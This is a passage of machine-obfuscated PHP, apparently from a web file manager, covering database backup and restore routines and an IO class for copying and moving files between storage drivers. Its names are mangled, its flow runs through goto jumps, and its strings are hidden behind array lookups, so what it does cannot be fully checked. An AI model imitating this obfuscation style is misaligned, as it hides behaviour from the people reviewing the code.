createTable($AÙñ¹õÍÀõ, $còÏˆù¿—Ì = null) { $Fîï¢Ñ†£Õ =& $_SERVER[Â€Á›¨õ]; if (!IO::exist($AÙñ¹õÍÀõ)) { ActionCall($Fîï¢Ñ†£Õ[993], !0, 0); show_json(LNG($Fîï¢Ñ†£Õ[994]), !1); } $aìàˆìôˆÜ = sqlSplit(IO::getContent($AÙñ¹õÍÀõ)); foreach ($aìàˆìôˆÜ as $dîÈÛ©™Á—) { if ($còÏˆù¿—Ì) { $cŞ°©Ø±ÍÂ = stripos($dîÈÛ©™Á—, $Fîï¢Ñ†£Õ[995]) === 0; if ($cŞ°©Ø±ÍÂ) { $còÏˆù¿—Ì->task[$Fîï¢Ñ†£Õ[996]] += 1; } } $this->model()->db()->execute($dîÈÛ©™Á—); if ($còÏˆù¿—Ì && $cŞ°©Ø±ÍÂ) { preg_match($Fîï¢Ñ†£Õ[997], $dîÈÛ©™Á—, $A²ºŞÀèˆ‡); $còÏˆù¿—Ì->task[$Fîï¢Ñ†£Õ[998]] = $A²ºŞÀèˆ‡[1]; $còÏˆù¿—Ì->update(1); } } $this->taskToCache($còÏˆù¿—Ì); } public function insertTable($b«ˆÛâè¢, $c‹é­ÈÄ« = null) { $d‹à†ÖÓ‘œ =& $_SERVER[Â€Á›¨õ]; $Eïš‰óçÄ = $this->model()->db(); $d»Ó‚ßîåê = $dà˜¶İ­Úì ? array($dà˜¶İ­Úì) : $Eïš‰óçÄ->getTables(); foreach ($b«ˆÛâè¢ as $FÎ¼ìô–áã) { $dà˜¶İ­Úì = basename($FÎ¼ìô–áã, $d‹à†ÖÓ‘œ[730]); if (!in_array($dà˜¶İ­Úì, $d»Ó‚ßîåê)) { continue; } if ($c‹é­ÈÄ«) { $c‹é­ÈÄ«->task[$d‹à†ÖÓ‘œ[998]] = $dà˜¶İ­Úì; } if (get_filesize($FÎ¼ìô–áã) == 0) { continue; } $bŞ•ò·Ì…× = $this->sqlToDb($FÎ¼ìô–áã, $c‹é­ÈÄ«); if (!$bŞ•ò·Ì…×) { ActionCall($d‹à†ÖÓ‘œ[993], !0, 0); show_json(LNG($d‹à†ÖÓ‘œ[999]) . "\133{$dà˜¶İ­Úì}\x5d", !1); } } $this->taskToCache($c‹é­ÈÄ«); } public function sqlFromDb($D¦’¦—¼°å, $fÓµƒ‡¾‹Û, $F½ç™‰ñ­Ì = null, $BØî÷Æ½Œ = null) { goto CìÊ¡£Û¯; EËá½¹ô—‹: $D‚ˆ„¤¶åñ = $DÙ¿‘¹·õ->getPk(); $Fù÷§ˆŠˆ = $DÙ¿‘¹·õ->getDbFields(); do { $e‰àæ²¼ƒö = $DÙ¿‘¹·õ->field($Fù÷§ˆŠˆ)->order($D‚ˆ„¤¶åñ . $_SERVER[Â€Á›¨õ][1001])->selectPage($B¡¼ËÅ•‚Á, $B¤°‹×ä–); $aÉ¡¬‡ä¢® = isset($e‰àæ²¼ƒö[$_SERVER[Â€Á›¨õ][362]][$_SERVER[Â€Á›¨õ][364]]) ? $e‰àæ²¼ƒö[$_SERVER[Â€Á›¨õ][362]][$_SERVER[Â€Á›¨õ][364]] : 0; $Aò²‡¶Ùš = !empty($e‰àæ²¼ƒö[$_SERVER[Â€Á›¨õ][365]]) ? $e‰àæ²¼ƒö[$_SERVER[Â€Á›¨õ][365]] : array(); if (!($EäÖËÇÅéİ = count($Aò²‡¶Ùš))) { break; } $eªæªĞ®¸÷ = array(); foreach ($Aò²‡¶Ùš as $aéÄó¼ˆ„) { if ($D¦’¦—¼°å == $_SERVER[Â€Á›¨õ][1002] && $aéÄó¼ˆ„[$_SERVER[Â€Á›¨õ][29]] == $_SERVER[Â€Á›¨õ][1003]) { $F†äñÆÑ¯½ = json_decode($aéÄó¼ˆ„[$_SERVER[Â€Á›¨õ][370]], !0); if ($F†äñÆÑ¯½[$_SERVER[Â€Á›¨õ][28]] == date($_SERVER[Â€Á›¨õ][703]) && !$F†äñÆÑ¯½[$_SERVER[Â€Á›¨õ][702]]) { continue; } } if ($BØî÷Æ½Œ) { $aéÄó¼ˆ„[$_SERVER[Â€Á›¨õ][75]] = "\173\x69\157\72{$BØî÷Æ½Œ}\x7d" . substr($aéÄó¼ˆ„[$_SERVER[Â€Á›¨õ][75]], strlen("\x7b\x69\157\72{$aéÄó¼ˆ„[$_SERVER[Â€Á›¨õ][760]]}\x7d")); $aéÄó¼ˆ„[$_SERVER[Â€Á›¨õ][760]] = $BØî÷Æ½Œ; } $eªæªĞ®¸÷[] = $_SERVER[Â€Á›¨õ][1004] . $this->sqlEncode($aéÄó¼ˆ„) . $_SERVER[Â€Á›¨õ][1005]; } $Cƒñã°ßóÙ = "\x49\x4e\x53\105\122\124\x20\111\x4e\x54\117\40\x60{$D¦’¦—¼°å}\140\40\x28\x60" . implode($_SERVER[Â€Á›¨õ][1006], $Fù÷§ˆŠˆ) . $_SERVER[Â€Á›¨õ][1007]; fwrite($aãñ†¤èîç, $Cƒñã°ßóÙ . implode($_SERVER[Â€Á›¨õ][1008], $eªæªĞ®¸÷) . $_SERVER[Â€Á›¨õ][67] . PHP_EOL); $B¤°‹×ä–++; $dºšŸ‚¼¹ += $EäÖËÇÅéİ; if ($F½ç™‰ñ­Ì) { $F½ç™‰ñ­Ì->update($EäÖËÇÅéİ); } } while ($B¤°‹×ä– <= $aÉ¡¬‡ä¢®); goto BÊ¶Õö™í; BÊ¶Õö™í: fclose($aãñ†¤èîç); return $dºšŸ‚¼¹; goto D®Ù…µŠó; CìÊ¡£Û¯: if ($F½ç™‰ñ­Ì) { $F½ç™‰ñ­Ì->task[$_SERVER[Â€Á›¨õ][998]] = $D¦’¦—¼°å; } $DÙ¿‘¹·õ = $this->model($D¦’¦—¼°å); $dºšŸ‚¼¹ = 0; goto A´Â•ä¢»; A´Â•ä¢»: $B¤°‹×ä– = 1; $B¡¼ËÅ•‚Á = 500; $aãñ†¤èîç = fopen($fÓµƒ‡¾‹Û, $_SERVER[Â€Á›¨õ][1000]); goto EËá½¹ô—‹; D®Ù…µŠó: } public function sqlToDb($bø‚¦¹„‚, $dâíŞ•¯¡İ = null) { goto aÉÆ²šº¹³; d„•½õ‡ß‰: $c«®Ì½°Ï = 500 + 1; while (!feof($FÃî—°ÍàÀ)) { if ($dâíŞ•¯¡İ && $Dóˆèºğœ¯ != 0) { $dâíŞ•¯¡İ->task[$b¸¤®¶òä[996]] += 1; } $Dóˆèºğœ¯++; $b†‚·óŠ¹Æ = trim(fgets($FÃî—°ÍàÀ)); $A‚ùõ·”ÄŒ .= $b¸¤®¶òä[50] . $this->sqlDecode($b†‚·óŠ¹Æ, $this->type); if ($Dóˆèºğœ¯ == $c«®Ì½°Ï) { $A‚ùõ·”ÄŒ = rtrim(trim($A‚ùõ·”ÄŒ), $b¸¤®¶òä[67]); if (!$FèÄÚ÷•ÄŠ->execute($A‚ùõ·”ÄŒ)) { return !1; } if ($dâíŞ•¯¡İ) { $dâíŞ•¯¡İ->update($Dóˆèºğœ¯ - 1); } $A‚ùõ·”ÄŒ = $b¸¤®¶òä[33]; $Dóˆèºğœ¯ = 0; } } fclose($FÃî—°ÍàÀ); goto eË²Ã‘Ş; FÒ£ñÉÂ›ã: if (!$FÃî—°ÍàÀ) { return !1; } $Dóˆèºğœ¯ = 0; $A‚ùõ·”ÄŒ = $b¸¤®¶òä[33]; goto d„•½õ‡ß‰; eË²Ã‘Ş: if (trim($A‚ùõ·”ÄŒ)) { $A‚ùõ·”ÄŒ = rtrim(trim($A‚ùõ·”ÄŒ), $b¸¤®¶òä[67]); if (!$FèÄÚ÷•ÄŠ->execute($A‚ùõ·”ÄŒ)) { return !1; } if ($dâíŞ•¯¡İ) { $dâíŞ•¯¡İ->update($Dóˆèºğœ¯ - 1); } } return !0; goto cé«›Óë”­; aÉÆ²šº¹³: $b¸¤®¶òä =& $_SERVER[Â€Á›¨õ]; $FèÄÚ÷•ÄŠ = $this->model()->db(); $FÃî—°ÍàÀ = @fopen($bø‚¦¹„‚, $b¸¤®¶òä[1009]); goto FÒ£ñÉÂ›ã; cé«›Óë”­: } public function dropTable($eÏïùõƒ±¦ = null) { $C¯Ü¼èé = $this->model()->db(); $F‚½˜ÛîËê = $eÏïùõƒ±¦ ? array($eÏïùõƒ±¦) : $C¯Ü¼èé->getTables(); if (!$F‚½˜ÛîËê) { return; } foreach ($F‚½˜ÛîËê as $eÏïùõƒ±¦) { $C¯Ü¼èé->execute("\x64\x72\157\x70\40\x74\x61\x62\154\x65\x20\x69\x66\40\x65\170\151\163\164\163\x20\x60{$eÏïùõƒ±¦}\x60"); } } private function taskToCache($få¡ÂÙëò = null) { $c‰œ¥ç˜÷Ä =& $_SERVER[Â€Á›¨õ]; if (!$få¡ÂÙëò) { return; } $Aíƒ¤ìîÏâ = array($c‰œ¥ç˜÷Ä[998] => $få¡ÂÙëò->task[$c‰œ¥ç˜÷Ä[998]], $c‰œ¥ç˜÷Ä[996] => $få¡ÂÙëò->task[$c‰œ¥ç˜÷Ä[996]], $c‰œ¥ç˜÷Ä[1010] => $få¡ÂÙëò->task[$c‰œ¥ç˜÷Ä[1010]]); if ($Aíƒ¤ìîÏâ[$c‰œ¥ç˜÷Ä[996]] == $Aíƒ¤ìîÏâ[$c‰œ¥ç˜÷Ä[1010]]) { $Aíƒ¤ìîÏâ[$c‰œ¥ç˜÷Ä[709]] = 1; } Cache::set($c‰œ¥ç˜÷Ä[1011] . $få¡ÂÙëò->task[$c‰œ¥ç˜÷Ä[388]], $Aíƒ¤ìîÏâ); $få¡ÂÙëò->end(); } private function sqlEncode($E¾ê¿éÑç) { $EÄĞÎßëÅØ =& $_SERVER[Â€Á›¨õ]; $cô”“ß¨Ú• = array(); foreach ($E¾ê¿éÑç as $cŠ”©ºŒ) { if (is_array($cŠ”©ºŒ)) { $cŠ”©ºŒ = json_encode_force($cŠ”©ºŒ); } $cŠ”©ºŒ = addslashes($cŠ”©ºŒ); $cŠ”©ºŒ = str_replace(array($EÄĞÎßëÅØ[1012], $EÄĞÎßëÅØ[227]), array($EÄĞÎßëÅØ[1013], $EÄĞÎßëÅØ[1014]), $cŠ”©ºŒ); $cô”“ß¨Ú•[] = str_replace($EÄĞÎßëÅØ[55], $EÄĞÎßëÅØ[1015], $cŠ”©ºŒ); } return $EÄĞÎßëÅØ[55] . implode($EÄĞÎßëÅØ[1016], $cô”“ß¨Ú•) . $EÄĞÎßëÅØ[55]; } private function sqlDecode($e¶´Ò‰Öåí, $c÷ÙÔ¾åê´) { $e¹»­‚…ƒ’ =& $_SERVER[Â€Á›¨õ]; $e¶´Ò‰Öåí = str_replace(array($e¹»­‚…ƒ’[1013], $e¹»­‚…ƒ’[1014]), array($e¹»­‚…ƒ’[1012], $e¹»­‚…ƒ’[227]), $e¶´Ò‰Öåí); if ($c÷ÙÔ¾åê´ == $e¹»­‚…ƒ’[9]) { $e¶´Ò‰Öåí = stripslashes($e¶´Ò‰Öåí); } return $e¶´Ò‰Öåí; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($BÍ¤Áù…Ş½, $A”¬¹å¢ïÄ) { goto fß·æÇ½â‰; c–‰—àÒëç: Hook::trigger($c±É¢É‹’¤[1018] . $BÍ¤Áù…Ş½ . $c±É¢É‹’¤[1019], $BèÆô½ë›); $BçÔ¦Š” = self::driverMake($A”¬¹å¢ïÄ[0]); if (method_exists($BçÔ¦Š”, $BÍ¤Áù…Ş½)) { $A¾ìŞ×µ“½ = @call_user_func_array(array($BçÔ¦Š”, $BÍ¤Áù…Ş½), $A”¬¹å¢ïÄ); } else { if (method_exists($BçÔ¦Š”, $c±É¢É‹’¤[1020])) { $A¾ìŞ×µ“½ = @call_user_func_array(array($BçÔ¦Š”, $BÍ¤Áù…Ş½), $A”¬¹å¢ïÄ); } else { if (method_exists(self, $BÍ¤Áù…Ş½)) { $A¾ìŞ×µ“½ = @call_user_func_array(array(self, $BÍ¤Áù…Ş½), $A”¬¹å¢ïÄ); } else { $A¾ìŞ×µ“½ = call_user_func_array(array(parent, $BÍ¤Áù…Ş½), $A”¬¹å¢ïÄ); } } } goto c¸³É¡ÅÈ; c¸³É¡ÅÈ: Hook::trigger($c±É¢É‹’¤[1018] . $BÍ¤Áù…Ş½ . $c±É¢É‹’¤[1021], $BèÆô½ë›, $A¾ìŞ×µ“½); return $A¾ìŞ×µ“½; goto bŞ„éñ¤î±; fß·æÇ½â‰: $c±É¢É‹’¤ =& $_SERVER[Â€Á›¨õ]; $BèÆô½ë› = $A”¬¹å¢ïÄ; $GLOBALS[$c±É¢É‹’¤[1017]] = $c±É¢É‹’¤[1018] . $BÍ¤Áù…Ş½; goto c–‰—àÒëç; bŞ„éñ¤î±: } public static function init($EŞ‡ŒÑàóè) { return self::driverMake($EŞ‡ŒÑàóè); } public static function copy($cò“Ôßˆ’”, $Eâ†›÷Ù¹Ğ, $BäÃÃÚ®×Ë = false, $e’¬ŒÜÚãÁ = false) { return self::copyMoveStart($cò“Ôßˆ’”, $Eâ†›÷Ù¹Ğ, $BäÃÃÚ®×Ë, $_SERVER[Â€Á›¨õ][513], $e’¬ŒÜÚãÁ); } public static function move($c™¬Ô•ù½, $eó¬Ùø¡‰¤, $FÚÄê»¶ = false, $cßßá §š… = false) { return self::copyMoveStart($c™¬Ô•ù½, $eó¬Ùø¡‰¤, $FÚÄê»¶, $_SERVER[Â€Á›¨õ][515], $cßßá §š…); } private static function copyMoveStart($Bµ£çëš†², $fò´“¿¨ë©, $c°Ô·„²ô, $eÂÏ‡…ôøÃ, $B¥Ñ‰Ü°‡¿) { $cÂ‰°İŞÈ² =& $_SERVER[Â€Á›¨õ]; $CÁ†Ğª­åÔ = array($Bµ£çëš†², $fò´“¿¨ë©, $c°Ô·„²ô, $B¥Ñ‰Ü°‡¿); Hook::trigger($cÂ‰°İŞÈ²[1018] . $eÂÏ‡…ôøÃ . $cÂ‰°İŞÈ²[1019], $CÁ†Ğª­åÔ); $C‡‘¬ì÷“Ÿ = self::copyMove($Bµ£çëš†², $fò´“¿¨ë©, $c°Ô·„²ô, $eÂÏ‡…ôøÃ, $B¥Ñ‰Ü°‡¿); Hook::trigger($cÂ‰°İŞÈ²[1018] . $eÂÏ‡…ôøÃ . $cÂ‰°İŞÈ²[1021], $CÁ†Ğª­åÔ, $C‡‘¬ì÷“Ÿ); return $C‡‘¬ì÷“Ÿ; } public static function saveFile($f™¾Ù‹øÚ¥, $B¸½Ù¡¾°Ú, $A÷¸‘ÖäÙÈ = true) { goto Eã¼º¥ù£ë; b·…ˆ¨Ö…š: $Fæ„ÉªÉºÄ = self::driverMake($B¸½Ù¡¾°Ú); $D§·ŸÍ¸òŞ = !1; if ($Fæ„ÉªÉºÄ->pathParse[$fõ¯ÏÃï±[1022]]) { $eÍä£’¤Œ = $Fæ„ÉªÉºÄ->pathParse[$fõ¯ÏÃï±[1022]]; $D§·ŸÍ¸òŞ = $Fæ„ÉªÉºÄ; $Fæ„ÉªÉºÄ = self::driverMake($eÍä£’¤Œ); } goto f¾¿âëÍ; a¤ùÇÙëå: $Bê§‡ŠõÒ = self::copyFile($AÂÈÅ›Şì, $f™¾Ù‹øÚ¥, $Fæ„ÉªÉºÄ, $DÜ—ˆ„â™, $e½Ê›»öÊ[$fõ¯ÏÃï±[28]], $bÛ£š‘¶›); if ($D§·ŸÍ¸òŞ) { $Bê§‡ŠõÒ = $D§·ŸÍ¸òŞ->getPathOuter($Bê§‡ŠõÒ); } return $Bê§‡ŠõÒ; goto eÅ¯‰°ÁÙ; Eã¼º¥ù£ë: $fõ¯ÏÃï± =& $_SERVER[Â€Á›¨õ]; $e½Ê›»öÊ = self::info($B¸½Ù¡¾°Ú); $AÂÈÅ›Şì = self::driverMake($f™¾Ù‹øÚ¥); goto b·…ˆ¨Ö…š; f¾¿âëÍ: $DÜ—ˆ„â™ = $Fæ„ÉªÉºÄ->pathFather($B¸½Ù¡¾°Ú); $bÛ£š‘¶› = !0; if (!$A÷¸‘ÖäÙÈ && self::driverIsSame($AÂÈÅ›Şì, $Fæ„ÉªÉºÄ)) { $bÛ£š‘¶› = !1; } goto a¤ùÇÙëå; eÅ¯‰°ÁÙ: } private static function copyMove($dë°ÊÎÇø, $cÁ²Óªß‹”, $B´ó˜½Ã™, $AŠÒâôì‚¥, $A”­¸½„Š = false) { goto f¿“ìà§¦; f¿“ìà§¦: $bÂ…°‘¿¸µ =& $_SERVER[Â€Á›¨õ]; if (!$dë°ÊÎÇø || $dë°ÊÎÇø == $bÂ…°‘¿¸µ[8] || !$cÁ²Óªß‹”) { return !1; } ignore_timeout(); goto fªÕ”Á¬ôÈ; a·ƒƒºĞ¼: $eæ‡óµßÈé = !1; if ($Eï·¬˜–Éˆ->pathParse[$bÂ…°‘¿¸µ[1022]]) { $cÁ²Óªß‹” = $Eï·¬˜–Éˆ->pathParse[$bÂ…°‘¿¸µ[1022]]; $eæ‡óµßÈé = $Eï·¬˜–Éˆ; $Eï·¬˜–Éˆ = self::driverMake($cÁ²Óªß‹”); } self::check($bÓœÍùî…ƒ, $dë°ÊÎÇø, $Eï·¬˜–Éˆ, $cÁ²Óªß‹”); goto B‰ï¹ñ§Ó; aÈÉôê‹: $AÈÄ‹…¤È÷ = $bÓœÍùî…ƒ->isFile($dë°ÊÎÇø); if (!$AÈÄ‹…¤È÷ && $Eï·¬˜–Éˆ->getType() == $bÂ…°‘¿¸µ[707] && $bÓœÍùî…ƒ->getType() == $bÂ…°‘¿¸µ[105]) { $E¥®À‰øùä = $Eï·¬˜–Éˆ->copyFolderFromIO($bÓœÍùî…ƒ, $dë°ÊÎÇø, $cÁ²Óªß‹”, $B´ó˜½Ã™, $Cæå³å¥Øº, $A”­¸½„Š); } else { $E¥®À‰øùä = self::copyPath($bÓœÍùî…ƒ, $dë°ÊÎÇø, $Eï·¬˜–Éˆ, $cÁ²Óªß‹”, $B´ó˜½Ã™, $Cæå³å¥Øº, $AÈÄ‹…¤È÷, $A”­¸½„Š); } if ($E¥®À‰øùä && $Cæå³å¥Øº) { $bÓœÍùî…ƒ->remove($dë°ÊÎÇø); } goto f™‰´¥¹±÷; f™‰´¥¹±÷: if ($eæ‡óµßÈé) { $E¥®À‰øùä = $eæ‡óµßÈé->getPathOuter($E¥®À‰øùä); } return $E¥®À‰øùä; goto Eá™ÉËõÆø; fªÕ”Á¬ôÈ: $bÓœÍùî…ƒ = self::driverMake($dë°ÊÎÇø); $Eï·¬˜–Éˆ = self::driverMake($cÁ²Óªß‹”); $Cæå³å¥Øº = $AŠÒâôì‚¥ == $bÂ…°‘¿¸µ[515]; goto a·ƒƒºĞ¼; B‰ï¹ñ§Ó: Hook::trigger($bÂ…°‘¿¸µ[72], $bÓœÍùî…ƒ, $dë°ÊÎÇø, $Eï·¬˜–Éˆ, $cÁ²Óªß‹”); $DÉ†ñìêƒŸ = self::driverIsSame($bÓœÍùî…ƒ, $Eï·¬˜–Éˆ); if ($DÉ†ñìêƒŸ) { if ($AŠÒâôì‚¥ == $bÂ…°‘¿¸µ[515] && !method_exists($Eï·¬˜–Éˆ, $bÂ…°‘¿¸µ[1023]) && trim($cÁ²Óªß‹”, $bÂ…°‘¿¸µ[8]) == trim($Eï·¬˜–Éˆ->pathFather($dë°ÊÎÇø), $bÂ…°‘¿¸µ[8])) { if ($bÓœÍùî…ƒ->pathThis($dë°ÊÎÇø) != $A”­¸½„Š && !$bÓœÍùî…ƒ->isTypeObject()) { return $bÓœÍùî…ƒ->rename($dë°ÊÎÇø, $A”­¸½„Š); } return $Eï·¬˜–Éˆ->getPathOuter($dë°ÊÎÇø); } if (method_exists($Eï·¬˜–Éˆ, $AŠÒâôì‚¥)) { return $Eï·¬˜–Éˆ->{$AŠÒâôì‚¥}($dë°ÊÎÇø, $cÁ²Óªß‹”, $B´ó˜½Ã™); } } goto aÈÉôê‹; Eá™ÉËõÆø: } private static function check($AÆƒÁæö”, $f°ÀÉçº’ë, $c­†Ñ¾ºà†, &$C’¼îáó£ä) { $AÌ¼á”×ŸÂ =& $_SERVER[Â€Á›¨õ]; if (self::driverIsSame($AÆƒÁæö”, $c­†Ñ¾ºà†) && $AÆƒÁæö”->isFolder($f°ÀÉçº’ë) && $AÆƒÁæö”->isParentOf($f°ÀÉçº’ë, $C’¼îáó£ä)) { show_json(LNG($AÌ¼á”×ŸÂ[1024]), !1); } if (!$AÆƒÁæö”->exist($f°ÀÉçº’ë)) { show_json(LNG($AÌ¼á”×ŸÂ[104]), !1); } } private static function copyPath($B©Ñ¾Õ†‹, $BÏÆËùì«, $EŒµÌ“‘­, $Aâ’‡’Ãçô, $cŠ¬’ÑŸãæ, $f×‚¢Á˜Âã, $e…‰³Å™ù, $CŸ¦ÇŒ²¹¢ = false) { goto bÛãáòß¦î; AÏºæª±óÑ: $B‰Ò™Â­ä = array_merge($BäÍ®¥Æ‰ø[$Déô¨ÆÜ—»[73]], $BäÍ®¥Æ‰ø[$Déô¨ÆÜ—»[74]]); foreach ($B‰Ò™Â­ä as $Dïœ÷Õ ÇË) { $d²œÀÚ—Å× = $Dïœ÷Õ ÇË[$Déô¨ÆÜ—»[29]] == $Déô¨ÆÜ—»[173]; $BÏÆËùì« = $B©Ñ¾Õ†‹->getPathInner($Dïœ÷Õ ÇË[$Déô¨ÆÜ—»[75]]); $EÂ¡®óù¥ = self::copyPath($B©Ñ¾Õ†‹, $BÏÆËùì«, $EŒµÌ“‘­, $Aâ’‡’Ãçô, $cŠ¬’ÑŸãæ, $f×‚¢Á˜Âã, $d²œÀÚ—Å×); if (!$EÂ¡®óù¥) { IO::errorTips($Déô¨ÆÜ—»[1025] . $BÏÆËùì« . $Déô¨ÆÜ—»[66] . $Aâ’‡’Ãçô); } } return $cè…ºÁìØ§; goto aÈò¥åï˜ó; bÊ§î¹ø½: if ($e…‰³Å™ù) { return self::copyFile($B©Ñ¾Õ†‹, $BÏÆËùì«, $EŒµÌ“‘­, $Aâ’‡’Ãçô, $Aƒî†ƒ–ØÚ, $f×‚¢Á˜Âã); } if ($cŠ¬’ÑŸãæ == REPEAT_RENAME_FOLDER) { $cŠ¬’ÑŸãæ = !1; } $a—±ÇŠ»… = rtrim($Aâ’‡’Ãçô, $Déô¨ÆÜ—»[8]) . $Déô¨ÆÜ—»[8] . $Aƒî†ƒ–ØÚ; goto Cµâ²Ò—¥ƒ; bÛãáòß¦î: $Déô¨ÆÜ—» =& $_SERVER[Â€Á›¨õ]; $Aƒî†ƒ–ØÚ = $CŸ¦ÇŒ²¹¢ ? $CŸ¦ÇŒ²¹¢ : $B©Ñ¾Õ†‹->pathThis($BÏÆËùì«); if ($cŠ¬’ÑŸãæ) { $D‡­«èöÛ = $EŒµÌ“‘­->fileNameExist($Aâ’‡’Ãçô, $Aƒî†ƒ–ØÚ); $Aƒî†ƒ–ØÚ = $EŒµÌ“‘­->fileNameAuto($Aâ’‡’Ãçô, $Aƒî†ƒ–ØÚ, $cŠ¬’ÑŸãæ, !$e…‰³Å™ù); $cŠ¬’ÑŸãæ = $D‡­«èöÛ ? $cŠ¬’ÑŸãæ : !1; } goto bÊ§î¹ø½; Cµâ²Ò—¥ƒ: $cè…ºÁìØ§ = $EŒµÌ“‘­->mkdir($EŒµÌ“‘­->getPath($a—±ÇŠ»…)); $Aâ’‡’Ãçô = $EŒµÌ“‘­->getPathInner($cè…ºÁìØ§); $BäÍ®¥Æ‰ø = $B©Ñ¾Õ†‹->listPath($BÏÆËùì«, !0); goto AÏºæª±óÑ; aÈò¥åï˜ó: } private static function copyFile($DÅ¼™Ã ©, $e¾èÈÉÙíİ, $eæ‘ñÇ¸’, $Eƒ¹¸‘âùÇ, $AÙÔ§Àä”Ê, $e›Èİ’Üß) { goto AÖ‚àßª—š; AÖ‚àßª—š: $cÒ©½ÅºŒ– =& $_SERVER[Â€Á›¨õ]; $Eƒ¹¸‘âùÇ = $eæ‘ñÇ¸’->getPath(rtrim($Eƒ¹¸‘âùÇ, $cÒ©½ÅºŒ–[8]) . $cÒ©½ÅºŒ–[8] . $AÙÔ§Àä”Ê); $FÂƒ‡»‰¡Ú = $cÒ©½ÅºŒ–[1026] . time() . rand_string(5); goto cßçĞ›„Í¢; aäÒá¹¼¼Æ: $f§®ùŒÉÏ  = $DÅ¼™Ã ©->iconvApp($f§®ùŒÉÏ ); $C¼ ¯“ÂÎ‚ = $eæ‘ñÇ¸’->upload($Eƒ¹¸‘âùÇ, $f§®ùŒÉÏ , $e›Èİ’Üß); self::remove($dï†Ğ–º² . $FÂƒ‡»‰¡Ú); goto E™êùßÖ”; cßçĞ›„Í¢: Hook::trigger($cÒ©½ÅºŒ–[1027], $DÅ¼™Ã ©, $e¾èÈÉÙíİ, $eæ‘ñÇ¸’, $Eƒ¹¸‘âùÇ, $AÙÔ§Àä”Ê, $FÂƒ‡»‰¡Ú); if (self::driverIsSame($DÅ¼™Ã ©, $eæ‘ñÇ¸’)) { if ($e›Èİ’Üß) { $C¼ ¯“ÂÎ‚ = $eæ‘ñÇ¸’->moveFile($e¾èÈÉÙíİ, $Eƒ¹¸‘âùÇ); } else { $C¼ ¯“ÂÎ‚ = $eæ‘ñÇ¸’->copyFile($e¾èÈÉÙíİ, $Eƒ¹¸‘âùÇ); } Hook::trigger($cÒ©½ÅºŒ–[1028], $DÅ¼™Ã ©, $e¾èÈÉÙíİ, $eæ‘ñÇ¸’, $Eƒ¹¸‘âùÇ, $AÙÔ§Àä”Ê, $C¼ ¯“ÂÎ‚); return $C¼ ¯“ÂÎ‚; } $dï†Ğ–º² = TEMP_FILES; goto DøË Äê‘ç; DøË Äê‘ç: mk_dir($dï†Ğ–º²); $f§®ùŒÉÏ  = $dï†Ğ–º² . $FÂƒ‡»‰¡Ú; $f§®ùŒÉÏ  = $DÅ¼™Ã ©->download($e¾èÈÉÙíİ, $f§®ùŒÉÏ ); goto aäÒá¹¼¼Æ; E™êùßÖ”: Hook::trigger($cÒ©½ÅºŒ–[1028], $DÅ¼™Ã ©, $e¾èÈÉÙíİ, $eæ‘ñÇ¸’, $Eƒ¹¸‘âùÇ, $AÙÔ§Àä”Ê, $C¼ ¯“ÂÎ‚); return $C¼ ¯“ÂÎ‚; goto d×Ï´·ô‘Ş; d×Ï´·ô‘Ş: } public static function pathFather($F¿ÈøŠğò‰) { $f½Õö˜é©¶ = IO::init($F¿ÈøŠğò‰); $BÍÙ¯Š£ƒÃ = $f½Õö˜é©¶->pathFather($f½Õö˜é©¶->path); return $f½Õö˜é©¶->getPathOuter($BÍÙ¯Š£ƒÃ); } public static function fileOut($FŸÀÓ™‚², $bôñôê³İ¸ = false, $FİÆ¼ˆ‰Èò = false, $f‰ïº“à¾‹ = '') { $BôØóŠõŠÛ = self::driverMake($FŸÀÓ™‚²); if ($BôØóŠõŠÛ->isFileOutServer()) { return $BôØóŠõŠÛ->fileOutServer($FŸÀÓ™‚², $bôñôê³İ¸, $FİÆ¼ˆ‰Èò, $f‰ïº“à¾‹); } return $BôØóŠõŠÛ->fileOut($FŸÀÓ™‚², $bôñôê³İ¸, $FİÆ¼ˆ‰Èò, $f‰ïº“à¾‹); } public static function fileOutImage($f³ßã‘éŠç, $eè•ãÎªµ± = 250) { $A‰®éºÀÀ¦ = array(250, 600, 1200, 3000, 5000); for ($c§¦èã“£Í = 0; $c§¦èã“£Í < count($A‰®éºÀÀ¦); $c§¦èã“£Í++) { if ($c§¦èã“£Í == 0 && $eè•ãÎªµ± <= $A‰®éºÀÀ¦[$c§¦èã“£Í]) { $eè•ãÎªµ± = $A‰®éºÀÀ¦[$c§¦èã“£Í]; break; } else { if ($eè•ãÎªµ± > $A‰®éºÀÀ¦[$c§¦èã“£Í - 1] && $eè•ãÎªµ± <= $A‰®éºÀÀ¦[$c§¦èã“£Í]) { $eè•ãÎªµ± = $A‰®éºÀÀ¦[$c§¦èã“£Í]; break; } else { if ($c§¦èã“£Í == count($A‰®éºÀÀ¦) - 1 && $eè•ãÎªµ± > $A‰®éºÀÀ¦[$c§¦èã“£Í]) { $eè•ãÎªµ± = $A‰®éºÀÀ¦[$c§¦èã“£Í]; break; } } } } $dÕœª—À³ì = self::driverMake($f³ßã‘éŠç); if ($dÕœª—À³ì->isFileOutServer()) { return $dÕœª—À³ì->fileOutImageServer($f³ßã‘éŠç, $eè•ãÎªµ±); } return $dÕœª—À³ì->fileOutImage($f³ßã‘éŠç, $eè•ãÎªµ±); } private static function driverIsSame($C´†ò¹ŸŒ¼, $C‘ù¸õ£ ) { goto E”øõğä­Œ; DÁàÊé¡«³: if ($C´†ò¹ŸŒ¼->pathDriver == $C‘ù¸õ£ ->pathDriver) { return !0; } return !1; goto Dø¿Õ¨ñ ã; B‰ÏÑ±ŠŞ: if ($d¸šè¾«¿ != $CÊÕÇôÎà) { return !1; } if ($d¸šè¾«¿ == $b„º‡Ğ…›[707]) { return !0; } if ($d¸šè¾«¿ == $b„º‡Ğ…›[105]) { return !0; } goto DÁàÊé¡«³; E”øõğä­Œ: $b„º‡Ğ…› =& $_SERVER[Â€Á›¨õ]; $d¸šè¾«¿ = $C´†ò¹ŸŒ¼->getType(); $CÊÕÇôÎà = $C‘ù¸õ£ ->getType(); goto B‰ÏÑ±ŠŞ; Dø¿Õ¨ñ ã: } public static function copyUpdate($fÔŠ‹Ë¨°‚, $fÖÊ‘Í¬‰å) { goto B­ç›å¬·Æ; b²İÕöÑç: Hook::trigger($fÔ‘Í”Ş‘ [1032], $fÔŠ‹Ë¨°‚, $fÖÊ‘Í¬‰å, $CÃ‡¨Ö¾Û); foreach ($aÙ‚Ò—‚Ûï as $c¯¢ù—ôó‡) { IO::mkdir($c¯¢ù—ôó‡); } foreach ($fÆäÖ÷ÔªÔ as 